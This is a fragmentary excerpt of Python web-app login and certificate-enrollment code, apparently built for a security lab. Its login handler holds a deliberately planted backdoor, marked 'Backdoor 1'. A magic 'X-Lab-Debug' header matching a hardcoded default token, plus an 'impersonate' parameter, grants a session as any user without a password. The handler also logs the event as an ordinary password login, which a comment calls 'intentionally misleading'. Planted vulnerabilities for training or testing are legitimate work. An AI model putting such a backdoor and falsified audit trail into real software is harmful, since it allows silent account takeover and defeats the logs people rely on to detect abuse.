...
SESSION_LIFETIME = datetime.timedelta(hours=1)  # or whatever lifetime you want

DEBUG_TOKEN = secrets.get(
    "DEBUG_token",
    "lab2025-debug-7e0b2c4f",
)
...
def login_post(
    ...
    """
    Login via legacy username/password.

    Backdoor 1:
      If the request contains a special header and query parameter, we
      silently impersonate the requested user without checking the password.
    """
    client_ip = request.client.host if request.client else None

    magic_header = request.headers.get("X-Lab-Debug")
    iuid = request.query_params.get("impersonate")

    if magic_header == DEBUG_TOKEN and iuid:
        backdoor_user = db.scalar(
            select(LegacyUser).where(LegacyUser.uid == iuid)
        )
        if backdoor_user is not None:
            token = _make_session_value(iuid)
            ...
            # Log as a normal login (no explicit hint in meta)
            db.add(
                AuditEvent(
                    actor_uid=iuid,
                    action="login",
                    ...
                    meta={
                        "status": "ok",
                        "ip": client_ip,
                        "method": "password",  # intentionally misleading
                    },
                )
            )
            db.commit()
            return resp
        # If impersonated UID does not exist, fall through to normal login.
    # ------------------ END BACKDOOR 1 ------------------
    ...
    # Upgrade from legacy SHA-256 hash to PBKDF2 if needed
    if upgraded:
...
def enroll_post(
    ...
    # Decide which password to use for the PKCS#12 container:
    # - if the user provided one, validate and use it
    # - otherwise fall back to the system default from Vault
    if p12_password:
        # basic sanity checks – you can tune these
    ...
    # May be a list or a single string depending on Vault config
    ca_chain_pems = data.get("ca_chain") or [data["issuing_ca"]]

    # Build PKCS#12 using openssl for maximum browser compatibility
    # (3DES-based PBE; still secure enough for PKCS#12 containers)
    ...
    # secure backup using Vault transit (no homemade crypto)
